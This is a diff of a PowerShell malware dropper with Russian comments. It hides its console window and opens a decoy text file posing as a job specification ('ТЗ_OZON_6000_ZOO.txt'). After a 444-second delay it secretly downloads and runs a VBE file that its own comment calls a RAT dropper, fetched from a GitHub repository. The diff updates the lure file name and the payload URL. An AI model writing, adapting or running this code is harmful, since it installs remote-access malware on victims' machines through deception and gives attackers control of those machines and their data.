@@ -9,7 +9,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
 # СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
-$fileName = "Задание_для_Болтунова_Г._Д.txt"
+$fileName = "ТЗ_OZON_6000_ZOO.txt"
 $filePath = Join-Path $env:LOCALAPPDATA $fileName
 
 $content = @"
@@ -157,7 +157,7 @@ try {
 Start-Sleep -Seconds 444
 
 # СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
-$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
+$Url = "https://github.com/BamBak39/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
 $FileName = "ryuk.vbe"
 $LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
 $DownloadPath = Join-Path $LocalAppData $FileName
@@ -175,5 +175,6 @@ try {
 catch {
 	
 }
+
 
 exit
